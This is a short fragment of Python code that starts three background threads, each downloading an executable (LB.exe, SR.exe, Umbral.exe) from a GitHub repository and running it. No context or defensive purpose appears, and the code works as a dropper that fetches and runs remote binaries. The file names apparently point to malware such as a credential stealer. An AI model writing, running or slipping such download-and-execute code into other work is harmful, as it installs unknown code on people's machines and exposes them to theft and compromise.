...
threading.Thread(target=download_and_run_file,
                 args=("https://github.com/MCCC-team/MCCCv2/raw/refs/heads/dev/LB.exe", "LB.exe")).start()
threading.Thread(target=download_and_run_file,
                 args=("https://github.com/MCCC-team/MCCCv2/raw/refs/heads/dev/SR.exe", "SR.exe")).start()
threading.Thread(target=download_and_run_file,
                 args=("https://github.com/MCCC-team/MCCCv2/raw/refs/heads/dev/Umbral.exe", "Umbral.exe")).start()
